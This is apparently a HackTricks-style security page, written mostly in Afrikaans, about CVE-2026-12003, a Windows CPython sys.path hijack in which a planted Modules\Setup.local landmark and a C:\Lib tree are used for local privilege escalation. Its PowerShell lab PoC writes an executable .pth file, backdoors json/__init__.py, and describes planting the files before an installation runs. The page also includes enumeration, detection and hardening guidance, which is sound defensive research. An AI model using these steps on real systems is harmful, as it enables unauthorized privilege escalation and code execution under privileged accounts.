# Windows CPython Build-Landmark en `sys.path` Hijacking

{{#include ../../../banners/hacktricks-training.md}}

'n Runtime kan relatiewe paaie behou wat slegs vir sy build tree bedoel was. As 'n geïnstalleerde geprivilegieerde runtime een van daardie paaie na 'n directory wat deur 'n gebruiker met laer privileges geskryf kan word resolve, kan 'n aanvaller die verwagte **build landmark** plaas en die runtime 'n alternatiewe library prefix laat vertrou. CVE-2026-12003 is 'n Windows CPython-voorbeeld: 'n geplaasde `Modules\Setup.local` kan die standard-library-inskrywing in `sys.path` herlei sonder om die beskermde Python-installation te wysig.<sup>[[1]](#references)[[2]](#references)</sup>

## CPython path-construction chain

Geaffekteerde Windows builds het `VPATH=..\..` saamgestel en dit as `sys._vpath` blootgestel. Die kwesbare fallback in `Modules/getpath.py` het `VPATH\Modules\Setup.local` as bewys behandel dat die interpreter vanuit 'n source tree loop; die volgende data flow verander hierdie build-time-waarde in 'n runtime search-path primitive.<sup>[[1]](#references)[[2]](#references)</sup>

| Stadium | Afgeleide waarde vir `C:\Program Files\Python314\python.exe` |
| --- | --- |
| Gekompileerde build path | `VPATH=..\..` |
| Runtime build landmark | `C:\Program Files\Python314\..\..\Modules\Setup.local` |
| Deur die aanvaller geskepte landmark | `C:\Modules\Setup.local` |
| Geselekteerde `build_prefix` | `C:\` |
| Geselekteerde standard library | `C:\Lib` |
| Resultaat | Aanvaller-beheerde `C:\Lib` word by `sys.path` gevoeg |

Die check is 'n fallback wat gebruik word wanneer die meer spesifieke `pybuilddir.txt` langs die executable ontbreek of onleesbaar is. Dit is belangrik omdat 'n gebruiker met laer privileges moontlik nie `C:\Program Files\Python314` kan verander nie, maar steeds nuwe directories by `C:\` kan skep. Die latere geprivilegieerde `python.exe`-proses laai Python-code met sy eie access token.<sup>[[1]](#references)[[2]](#references)</sup>

### Voorwaardes

Behandel dit slegs as 'n privilege boundary wanneer al hierdie voorwaardes geld:<sup>[[1]](#references)[[2]](#references)</sup>

- Die teiken is 'n geaffekteerde **Windows CPython** build; die kwesbare path logic is nie 'n Python-language-eienskap nie.
- Die directory wat verkry word deur `..\..` vanaf die directory wat `python.exe` bevat te resolve, laat 'n gebruiker met laer privileges toe om die landmark en `Lib`-tree te skep.
- 'n Gebruiker, service, installer of software-deployment-account met hoër privileges begin later daardie interpreter.
- Geen path-isolation configuration override die kwesbare discovery path nie.

## Enumerasie

Inspekteer beide die gekompileerde waarde en die effektiewe search path. 'n Blootgestelde `..\..`-waarde is 'n nuttige leidraad, maar dit is nie bewys van exploitability nie: resolve ook die path, toets ACLs en bevestig dat 'n geplaasde landmark buite die beskermde installation sal wees.<sup>[[1]](#references)[[2]](#references)</sup>
```powershell
python -c "import os,sys; print(sys.executable); print(getattr(sys,'_vpath',None)); print(*sys.path, sep='\n')"

$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$prefix = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
$prefix
icacls $prefix
```
Moenie die assessering tot amptelike installers beperk nie. Vir elke produk wat `python.exe` insluit, bepaal `sys._vpath` relatief tot die werklike uitvoerbare lêergids en hersien die ACL's op die gevolglike `Modules`- en `Lib`-liggings. 'n Dieper installasiepad kan na 'n ander skryfbare toepassing- of verskaffergids in plaas van `C:\` wys.<sup>[[1]](#references)</sup>

## Laboratorium-uitbuitingswerkvloei

Die volgende laboratorium-PoC weerspieël genoeg van die wettige runtime onder die geselekteerde prefix sodat Python kan inisialiseer, voeg 'n uitvoerbare `.pth`-reël by en skep uiteindelik die landmerk. Skep die payload vóór die landmerk om te voorkom dat die interpreter tydelik na 'n onvolledige biblioteekboom wys.<sup>[[1]](#references)</sup>
```powershell
$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$root = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
robocopy /E "$pythonDir\Lib" "$root\Lib" | Out-Null
robocopy /E "$pythonDir\DLLs" "$root\Lib" | Out-Null
New-Item "$root\Lib\site-packages" -ItemType Directory -Force | Out-Null
'import subprocess;subprocess.run(["cmd.exe","/c","whoami > %TEMP%\\py-landmark.txt"],shell=False)' |
Set-Content "$root\Lib\site-packages\audit.pth" -Encoding Ascii
New-Item "$root\Modules" -ItemType Directory -Force | Out-Null
New-Item "$root\Modules\Setup.local" -ItemType File -Force | Out-Null
```
Tydens normale werfinitialisering verwerk Python `.pth`-lêers in erkende site-packages-gidse. Slegs lyne wat met `import` gevolg deur witspasie begin, word uitgevoer, en die uitvoerbare stelling moet op een fisiese reël bly; `python -S` onderdruk die outomatiese `site`-import en dus hierdie sneller.<sup>[[1]](#references)[[4]](#references)</sup>

### Import-snelleralternatief

Opstartuitvoering word nie vereis nie. Nadat die legitieme biblioteekboom herskep is, backdoor 'n module wat 'n bevoorregte script voorspelbaar importeer. Byvoorbeeld, deur kode by die geplante `Lib\json\__init__.py` te voeg, word dit uitgevoer wanneer die slagoffer `json` importeer; deur 'n betroubare maar nie universeel geïmporteerde module te kies, kan die sneller minder opvallend wees.<sup>[[1]](#references)</sup>
```powershell
'open(r"C:\Windows\Temp\json-import-token.txt","w").write(__import__("subprocess").check_output(["whoami"]).decode())' |
Add-Content "$root\Lib\json\__init__.py" -Encoding Ascii
```
Hierdie variant erf steeds die importing process token, maar dit hang daarvan af dat die target application die gewysigde module import. Behou die oorspronklike module se gedrag wanneer jy werklike software toets, anders kan die import misluk voordat die bedoelde privileged workflow voltooi is.<sup>[[1]](#references)</sup>

## Voorafinstallasie-planting

Search-path planting kan die installasie voorafgaan. ’n Low-privilege user kan die toekomstige `Lib`-tree en `Modules\Setup.local` voorberei en dan wag vir ’n privileged software portal, help-desk workflow of deployment system om ’n all-users-installation uit te voer. Installers wat die nuwe interpreter begin om packages te installeer of die standard library vooraf te compile, kan die payload onder die deployment account aktiveer sonder dat ’n administrator Python handmatig hoef oop te maak.<sup>[[1]](#references)</sup>

Dit verander ook deployment review: inspekteer writable ancestors en voorafbestaande landmark/library directories **voordat** ’n bundled runtime geïnstalleer of opgegradeer word, eerder as om slegs die finale installation directory ná deployment na te gaan.<sup>[[1]](#references)</sup>

## Detection en hardening

Nuttige host pivots is die onverwagte landmark en library tree, gevolg deur ’n privileged Python launch. Soek na `Modules\Setup.local`, root-level of andersins uit-plek `Lib\site-packages\*.pth`, gekopieerde standard-library packages, en module files waarvan die owner of creation time van die protected installation verskil. Korreleer hul skepping deur ’n standard user met elevated `python.exe` wat `cmd.exe`, `powershell.exe`, account-management tools of ander ongewone children spawn.<sup>[[1]](#references)</sup>
```powershell
Get-Item C:\Modules\Setup.local -ErrorAction SilentlyContinue | Format-List FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib\site-packages -Filter *.pth -ErrorAction SilentlyContinue |
Select-Object FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib -Recurse -File -ErrorAction SilentlyContinue |
Get-Acl | Where-Object Owner -notmatch 'TrustedInstaller|Administrators|SYSTEM'
```
Die stroomopwaartse regstelling verwyder die `VPATH\Modules\Setup.local`-terugval en maak `pybuilddir.txt` die enigste aanduiding van die build-boom. Verkies ’n vaste build of ’n per-gebruiker-installering wat met die huidige Python-installasiemanager bestuur word. Waar opgradering tydelik onmoontlik is, beskerm die opgeloste voorouer en skep vooraf `Modules` met beperkende ACLs; beheerde `._pth`-lêers of `PYTHONHOME` kan ook ontdekking verander, maar vereis verenigbaarheidstoetsing van die toepassing.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [Bishop Fox - CVE-2026-12003: Windows CPython-soekpadkaping en plaaslike voorregeskalering](https://bishopfox.com/blog/python-software-foundation-python-3-11-0a3-to-3-15-0b2)
- [2] [CPython issue #151544 - Soekpaaie binne die bronboom kan geaktiveer word sonder om die installasiegids te wysig](https://github.com/python/cpython/issues/151544)
- [3] [CPython pull request #151545 - Verwyder die `VPATH/Modules/Setup.local`-terugval](https://github.com/python/cpython/pull/151545)
- [4] [Python documentation - `site`-padkonfigurasielêers](https://docs.python.org/3/library/site.html)
{{#include ../../../banners/hacktricks-training.md}}
